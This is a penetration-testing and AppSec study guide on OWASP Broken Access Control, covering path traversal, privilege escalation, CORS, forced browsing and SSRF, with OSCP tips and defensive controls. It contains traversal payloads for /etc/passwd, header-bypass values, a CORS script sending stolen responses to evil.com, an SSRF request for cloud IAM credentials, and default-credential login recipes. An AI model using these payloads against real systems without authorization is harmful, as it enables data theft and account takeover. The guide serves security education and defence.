# A01:2021 - Broken Access Control

> OWASP Top 10:2021 - A01
> OWASP Top 10:2025 - A01 (SSRF merged into this category)
>
> Access control enforces policy such that users cannot act outside of
> their intended permissions. Failures typically lead to unauthorized
> information disclosure, modification, or destruction of data.

---

## Table of Contents

- [1. What Broken Access Control Is](#1-what-broken-access-control-is)
- [2. Common Variants](#2-common-variants)
- [3. Path Traversal](#3-path-traversal)
- [4. Privilege Escalation (Horizontal / Vertical)](#4-privilege-escalation-horizontal--vertical)
- [5. CORS Misconfiguration](#5-cors-misconfiguration)
- [6. Forced Browsing](#6-forced-browsing)
- [7. SSRF as Broken Access Control](#7-ssrf-as-broken-access-control)
- [8. Detection Workflow](#8-detection-workflow)
- [9. Exploitation Recipes](#9-exploitation-recipes)
- [10. Risk Context (AppSec)](#10-risk-context-appsec)
- [11. Root Causes (AppSec)](#11-root-causes-appsec)
- [12. Preventive Controls (AppSec)](#12-preventive-controls-appsec)
- [13. Detection Controls (AppSec)](#13-detection-controls-appsec)
- [14. Verification (AppSec)](#14-verification-appsec)
- [15. OSCP Notes](#15-oscp-notes)
- [16. Production Notes](#16-production-notes)
- [17. References](#17-references)

---

## 1. What Broken Access Control Is

Access control is the enforcement of who can do what. It is not
authentication (who you are) and not authorization in the OAuth sense
(what scopes you granted). It is the check the application performs
on every request: "is this user allowed to perform this action on
this resource?"

Broken Access Control is the #1 risk in OWASP Top 10:2021. It is
also the hardest to test automatically: a scanner cannot know what
"should" be allowed.

**Key distinction:**

- **Authentication failure:** anyone can log in as anyone.
- **Access control failure:** a logged-in user can act as another
  user, or as an admin, or access resources they should not see.

---

## 2. Common Variants

| Variant | Description | Where it lives |
|---------|-------------|----------------|
| IDOR | Direct object reference to another user's resource | `08 Vulnerabilities/IDOR.md` |
| Path Traversal | `../` to escape the intended directory | this file, section 3 |
| Privilege Escalation | Horizontal (peer) or vertical (admin) | this file, section 4 |
| CORS Misconfiguration | Overly permissive cross-origin policy | this file, section 5 |
| Forced Browsing | Access to unlinked but reachable endpoints | this file, section 6 |
| SSRF | Server fetches attacker-controlled URL | `08 Vulnerabilities/SSRF.md` + section 7 |
| Open Redirect | Unvalidated redirect target | `08 Vulnerabilities/Open-Redirect.md` |
| CSRF | Forged request from a trusted session | `08 Vulnerabilities/CSRF.md` |

---

## 3. Path Traversal

Also called directory traversal. The application reads or writes a
file whose path is built from user input, and the input contains
`../` (or an encoded equivalent) to escape the intended directory.

### Detection

Look for parameters that name a file:

- `?file=`, `?page=`, `?path=`, `?doc=`, `?template=`, `?download=`
- HTTP headers: `X-File-Name`, `X-Template`
- Cookie values used as file names

### Payloads

```text
../../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd          (URL-encoded)
..%252f..%252f..%252fetc%252fpasswd  (double-encoded)
....//....//....//etc/passwd          (filter bypass)
..\/..\/..\/etc/passwd                (mixed separators)
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

### Windows-specific

```text
..\..\..\windows\win.ini
..%5c..%5c..%5cwindows%5cwin.ini
C:\windows\win.ini
\\?\C:\windows\win.ini
```

### Expected output (Linux)

```text
$ curl -s "http://target/download?file=../../../../etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

### Bypass techniques

- Null byte: `../../../etc/passwd%00.png` (PHP < 5.3.4).
- Absolute path: `/etc/passwd` (when the app prepends a base dir).
- UTF-8 overlong: `%c0%ae%c0%ae/`.
- Nested traversal: `....//` collapses to `../` after one pass of filtering.

### References

- [PortSwigger - Path Traversal](https://portswigger.net/web-security/file-path-traversal)
- [OWASP - Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)

---

## 4. Privilege Escalation (Horizontal / Vertical)

**Horizontal:** user A accesses user B's resources. Same role, different
identity. This is usually IDOR.

**Vertical:** a regular user performs an admin action. Different role,
same identity.

### Horizontal (IDOR pattern)

```text
GET /api/users/1001/profile      (your own)
GET /api/users/1002/profile      (another user)
```

Test with:

- Sequential IDs (1001, 1002, 1003).
- UUIDs from other responses (leaked via API, JS, or error messages).
- Hashids / base64-encoded IDs (decode, modify, re-encode).

### Vertical (admin function)

Look for endpoints that are admin-only:

- `/admin/`, `/api/admin/`, `/internal/`, `/debug/`
- Hidden buttons in HTML that call privileged APIs.
- API endpoints used by admin UI but reachable by any authenticated user.

Test by:

1. Logging in as low-privilege user.
2. Calling the admin endpoint directly (curl, Burp Repeater).
3. If the server does not check the role, the action succeeds.

### HTTP method confusion

Some frameworks check the role only on `GET`, not on `POST`, or vice
versa. Try:

```text
GET  /admin/delete?id=1     -> 403
POST /admin/delete          -> 200 (no check)
```

Also try `X-HTTP-Method-Override`, `X-Original-URL`, `X-Rewrite-URL`.

### Header-based bypass

```text
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
```

Some apps trust these headers to decide "internal" access.

### OSCP example (typical pattern)

On HTB/OSCP machines, this often appears as:

1. Web app has a user panel and an admin panel.
2. Admin panel is reachable but returns 403 for non-admin.
3. Role is stored in a JWT, cookie, or hidden form field.
4. Change `"role":"user"` to `"role":"admin"` in the JWT payload
   (if signature is not verified) or in the cookie.

See `06 Technologies/JWT.md` for the JWT-specific workflow.

---

## 5. CORS Misconfiguration

Cross-Origin Resource Sharing controls which origins can read
responses from your domain. Misconfigurations allow an attacker's
page to read authenticated responses.

### Detection

Send a request with an `Origin` header and inspect the response:

```text
$ curl -s -I -H "Origin: https://evil.com" https://target/api/me
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

If `Access-Control-Allow-Origin` reflects the `Origin` value AND
`Access-Control-Allow-Credentials: true` is present, the API is
vulnerable.

### Variants

| Pattern | Vulnerable? |
|---------|-------------|
| `Access-Control-Allow-Origin: *` | No (credentials not allowed) |
| `Access-Control-Allow-Origin: https://evil.com` + credentials | **Yes** |
| `Access-Control-Allow-Origin: null` + credentials | **Yes** (sandboxed iframe) |
| Reflects origin, checks suffix `.target.com` | **Yes** if `evil-target.com` is allowed |

### Exploitation

Host a page on `https://evil.com`:

```html
<script>
fetch('https://target/api/me', { credentials: 'include' })
  .then(r => r.text())
  .then(d => fetch('https://evil.com/log?data=' + encodeURIComponent(d)));
</script>
```

The victim visits `https://evil.com`, the browser sends their
`target.com` cookies, and the response is exfiltrated.

### References

- [PortSwigger - CORS](https://portswigger.net/web-security/cors)

---

## 6. Forced Browsing

Accessing resources that are not linked in the UI but exist on the
server. Not a vulnerability by itself, but a common way to find
admin panels, backup files, and debug endpoints.

### Common targets

```text
/admin
/admin/login
/api/v1/users
/backup
/backup.zip
/.git/config
/.env
/config.php.bak
/swagger
/swagger-ui.html
/api-docs
/actuator
/actuator/env
/debug
/console
/phpinfo.php
/server-status
```

### Tools

- `ffuf`, `feroxbuster`, `gobuster dir` - see `01 Recon/`.
- `nuclei` with exposure templates.

### Backup file extensions

```text
.bak .bak1 .old .orig .save .swp .tmp .copy .txt .zip .tar.gz .sql
```

For a given file `config.php`, try:

```text
config.php.bak
config.php.old
config.php~
config.phps
config.php.swp
```

---

## 7. SSRF as Broken Access Control

In OWASP Top 10:2021, SSRF is a separate category (A10). In the
2025 revision, it is merged into A01 because it is fundamentally an
access control failure: the server performs requests outside its
intended scope.

**Full SSRF workflow:** see `08 Vulnerabilities/SSRF.md`.

### Why it belongs to A01

- The vulnerable server acts as a proxy for the attacker.
- It bypasses network ACLs the attacker cannot bypass directly.
- It reaches internal services that are not exposed to the internet.
- In cloud environments, it reaches the metadata endpoint
  (`169.254.169.254`) and steals IAM credentials.

### Quick check

```text
$ curl "http://target/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

If the response contains AWS credentials, you have SSRF with
metadata access.

---

## 8. Detection Workflow

1. **Map the application.** Log in with every role you can create.
   List every endpoint reached by each role.
2. **Identify resource identifiers.** IDs, UUIDs, filenames, emails.
3. **Test horizontal access.** Use user A's session to request user B's
   resources (IDOR, path traversal).
4. **Test vertical access.** Use a low-privilege session to call
   admin endpoints (forced browsing, method confusion, header bypass).
5. **Test CORS.** Send `Origin: https://evil.com` and inspect headers.
6. **Test SSRF.** Find URL parameters and point them to internal
   addresses (127.0.0.1, 169.254.169.254, private ranges).
7. **Test redirects.** Find `?next=`, `?redirect=`, `?url=` and point
   them to `https://evil.com`.

---

## 9. Exploitation Recipes

### IDOR to account takeover

1. Find endpoint that returns user data by ID.
2. Enumerate IDs to find admin or another user.
3. If the endpoint also allows update (PUT/PATCH), change the email
   or password of the target account.

### Path traversal to RCE

1. Find file-write endpoint (upload, log, cache).
2. Write to a web-accessible directory using traversal.
3. Access the file via HTTP and execute.

### CORS to data exfiltration

1. Confirm `Access-Control-Allow-Origin` reflects `Origin` and
   `Access-Control-Allow-Credentials: true`.
2. Host a page that fetches the target and logs the response.
3. Send the link to the victim.

### SSRF to cloud credential theft

1. Find URL parameter.
2. Point to `http://169.254.169.254/latest/meta-data/iam/security-credentials/`.
3. Use the returned access key + secret to access the cloud account.

### Forced browsing to admin panel

1. Fuzz common admin paths.
2. Find `/admin` with no authentication or default credentials.
3. Log in with `admin:admin`, `admin:password`, etc.

---

## 10. Risk Context (AppSec)

**Why this is #1.** Broken Access Control holds the top spot in the
2021 ranking for a simple reason: it is the most common serious
finding in web application assessments, and it is the most likely to
lead to mass data exposure.

**Real-world pattern.** The typical breach looks like this:

1. An API exposes a resource by a predictable identifier
   (`/api/invoices/10042`).
2. The server checks that the request is authenticated, but not
   that the authenticated user owns the resource.
3. An attacker enumerates identifiers and downloads every record.
4. The breach is discovered months later, after the data appears
   for sale.

The pattern is not exotic. It does not require a memory corruption
bug, a zero-day, or a sophisticated exploit. It requires only that
the access check was omitted, or implemented incorrectly, on a
single endpoint.

**Why scanners miss it.** An automated scanner has no model of what
a given user "should" be allowed to do. It can send requests, but it
cannot decide whether a `200 OK` response represents correct behavior
or a privilege violation. Detecting access control bugs requires
understanding the application's intended authorization model, which
in turn requires reading its specification, its UI, and its API.

**AppSec relevance.** This is the category where secure design,
correct implementation, and continuous verification matter most. A
strong access control layer is the single highest-value control an
AppSec program can put in place.

---

## 11. Root Causes (AppSec)

Access control failures do not come from a single bug class. They
come from recurring architectural and process failures:

**1. Missing server-side enforcement.** The UI hides the admin
button, so the developer assumes the action is protected. It is not:
the API endpoint is reachable by anyone who knows the URL. Client-side
checks are not access control.

**2. Trusting user-supplied identifiers.** The server accepts an ID
from the request and uses it directly, without verifying that the
authenticated user owns the referenced object. This is the root of
IDOR.

**3. Deny-by-default not applied.** New endpoints are added with no
explicit authorization rule and inherit whatever default the framework
provides. If the default is "allow", every new route is a potential
vulnerability.

**4. Authorization logic scattered across the codebase.** Each
endpoint implements its own check, in its own way. Some check the role,
some check ownership, some check both. Inconsistency guarantees gaps.

**5. No central policy model.** There is no single place that defines
"who can do what". Without it, every new feature is an opportunity to
forget a check.

**6. CORS misconfiguration by copy-paste.** A permissive CORS policy
is copied from a development environment into production, allowing
cross-origin reads with credentials.

**7. No tests for authorization.** The test suite covers the happy path
for each role, but never tests role A accessing role B's resources.
Access control bugs survive until an external tester finds them.

---

## 12. Preventive Controls (AppSec)

These are the controls that close the category at the design level.

**Deny by default.** Every endpoint requires an explicit access rule.
If no rule is defined, the request is rejected. This is the single
most effective control.

**Centralized policy engine.** Define authorization rules in one
place (for example, an OPA / Cedar / Casbin policy, or a centralized
middleware) rather than per-endpoint `if` statements. Centralization
makes rules auditable and consistent.

**Object-level authorization.** For every request that references an
object (by ID, UUID, or path), verify that the authenticated principal
owns or is permitted to access that specific object. Do not rely on
the client to send the right ID.

**Function-level authorization.** For every administrative or
privileged action, verify the caller's role server-side. Role
information must come from a trusted source (session, signed token),
never from a client-controlled parameter.

**Server-side enforcement only.** Client-side hidden fields, disabled
buttons, and JavaScript checks are UX, not security. Every check must
be repeated on the server.

**Strict CORS policy.** Allow only the origins that must be allowed.
Never combine `Access-Control-Allow-Origin: *` with credentials, and
never reflect an arbitrary `Origin` header. Validate against a static
allowlist.

**SSRF-specific controls.** Egress filtering, URL allowlists, disabling
unused URL schemes, and blocking the cloud metadata endpoint
(`169.254.169.254`) at the network layer.

**Rate-limit identifier enumeration.** Sequential IDs plus no rate
limit equals a full data dump. Apply per-user rate limits on any
endpoint that returns objects by identifier.

---

## 13. Detection Controls (AppSec)

Prevention is not enough. If a control fails, detection is the next
line of defense.

**Log every authorization decision.** For each request, log:

- the authenticated principal;
- the resource requested;
- the decision (allow / deny);
- the rule that fired.

This is the raw material for both incident response and false-positive
tuning.

**Alert on patterns, not single events.** A single `403` is noise.
A single user generating hundreds of `403`s across sequential IDs is
an enumeration attempt.

**Alert on cross-tenant access.** In a multi-tenant system, an access
from tenant A to a resource owned by tenant B is always suspicious,
even if it returns `200`.

**Alert on unusual resource access volume.** A user downloading 10,000
records in an hour is a different signal than the same user
downloading 10.

**Watch for CORS anomalies.** Log CORS preflight requests with
unexpected `Origin` headers. Repeated preflights from a single origin
that is not in the allowlist is a signal.

**Monitor SSRF egress.** Any request from the application to
`169.254.169.254`, `127.0.0.1`, or RFC1918 addresses that is not part
of normal operation should be logged and alerted.

---

## 14. Verification (AppSec)

How to prove the controls actually work.

**Test with every role.** If the application has N roles, test all N
against every endpoint. The matrix is N x endpoints, and it must be
walked manually at least once per release.

**Test object ownership.** For every endpoint that accepts an object
identifier, attempt to access an object owned by a different user
with the same role (horizontal) and with a higher-privilege role
(vertical).

**Test unauthenticated access.** Every endpoint should be tested
without credentials. If it returns data or performs an action, the
authorization model has a gap.

**Test CORS with a rogue origin.** Send `Origin: https://evil.example`
to every API endpoint and inspect the response headers. The origin
should never be reflected with credentials enabled.

**Automate the regression.** Convert the manual checks into automated
tests where possible: a test suite that logs in as each role and
attempts cross-role access on every endpoint. Run it in CI.

**ASVS mapping.** Relevant ASVS 4.0.3 chapters: V4 (Access Control),
V8 (Data Protection), V14 (Configuration). Use these as the
verification checklist for the category.

**OWASP resources for verification:**

- OWASP ASVS: https://owasp.org/www-project-application-security-verification-standard/
- OWASP WSTG (Web Security Testing Guide): https://owasp.org/www-project-web-security-testing-guide/
- OWASP Cheat Sheet - Authorization: https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html
- OWASP Cheat Sheet - Access Control: https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html

---

## 15. OSCP Notes

> [!IMPORTANT]
> OSCP report: take a screenshot of the request that proves the access
> control failure (e.g. your low-privilege session reading an admin
> resource). Include the full URL and the response.

> [!IMPORTANT]
> OSCP report: for IDOR, screenshot the two requests side by side
> (your own resource + the target resource) to show the difference.

Key patterns for OSCP:

- IDOR is the most common access control bug on HTB machines.
- Forced browsing with `ffuf`/`gobuster` finds admin panels fast.
- If you see a JWT, check the payload for a `role` field - see
  `06 Technologies/JWT.md`.
- SSRF to `169.254.169.254` is common on cloud-themed machines.

---

## 16. Production Notes

- **Automated scanners are weak here.** Burp Suite's "Access control"
  checks help, but manual testing by role is required.
- **Log every access decision.** Missing logs make incident response
  impossible (see A09).
- **Deny by default.** Every endpoint should require explicit access
  control, not inherit "public" by default.
- **Test with every role.** If your app has 5 roles, test all 5 against
  all endpoints. This is where most real-world access control bugs live.
- **Rate-limit ID enumeration.** Sequential IDs + no rate limit =
  full data dump in minutes.
- **Separate authentication from authorization.** Passing auth does not
  imply passing authz. Every request needs both.

---

## 17. References

**OWASP:**

- [OWASP Top 10:2021 - A01](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [OWASP Top 10:2025](https://owasp.org/Top10/2025/)
- [OWASP ASVS](https://owasp.org/www-project-application-security-verification-standard/)
- [OWASP WSTG](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP Cheat Sheet - Authorization](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html)
- [OWASP Cheat Sheet - Access Control](https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html)
- [OWASP Cheat Sheet - CORS](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Origin_Resource_Sharing_Cheat_Sheet.html)

**PortSwigger Web Security Academy:**

- [Access Control](https://portswigger.net/web-security/access-control)
- [Path Traversal](https://portswigger.net/web-security/file-path-traversal)
- [CORS](https://portswigger.net/web-security/cors)
- [SSRF](https://portswigger.net/web-security/ssrf)

**Internal cross-references:**

- [IDOR](../08%20Vulnerabilities/IDOR.md)
- [SSRF](../08%20Vulnerabilities/SSRF.md)
- [Open-Redirect](../08%20Vulnerabilities/Open-Redirect.md)
- [CSRF](../08%20Vulnerabilities/CSRF.md)
- [JWT](../06%20Technologies/JWT.md)
- [OAuth](../06%20Technologies/OAuth.md)
